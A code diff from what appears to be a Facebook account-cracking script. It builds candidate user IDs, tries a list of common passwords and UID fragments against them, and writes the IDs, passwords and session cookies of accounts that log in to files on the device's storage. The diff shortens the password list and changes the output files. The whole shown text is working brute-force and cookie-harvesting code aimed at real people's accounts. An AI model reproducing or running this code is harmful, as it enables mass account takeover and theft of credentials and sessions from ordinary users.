@@ -293,7 +293,7 @@ def numb():
         for i in user:
             uid=code+i
             fb=tsg
-            pwx = [code,'bangladesh','i love you','nusrat','shahin','fatema','hridoy','mababa','@@@###','@#@#@#','405060','708090','445566','778899']
+            pwx = [code,'bangladesh','i love you','@#@#@#','405060','708090','445566','778899']
             pwx.append(uid[5:])#back 6
             pwx.append(uid[4:])#back 7
             pwx.append(uid[3:])#back 8
@@ -326,7 +326,7 @@ def need(uid,pwx,fb,tl):
                 print("\r\r\n\n")
                 print(Panel(f"\r\r\n[white reverse][🔷]=UID/PAS[/white reverse] [bold green]{xd} [cyan]• [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[🔶][/yellow reverse][bold green]{coki}\n",title=f"[red reverse][TOTAL-OK {hh}]"))
                 #print(f"\r\r\n[white reverse][🔷]=UID/PAS[/white reverse] [bold green]{xd} [cyan]• [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[🔶][/yellow reverse][bold green]{coki}\n")
-                open(f'/sdcard/RJ•OK•M2.txt', 'a').write(uids+'|'+pas+'\n')
+                open('/sdcard/SHANTO_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SHANTO_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                 ok.append(uid)
                 break
             
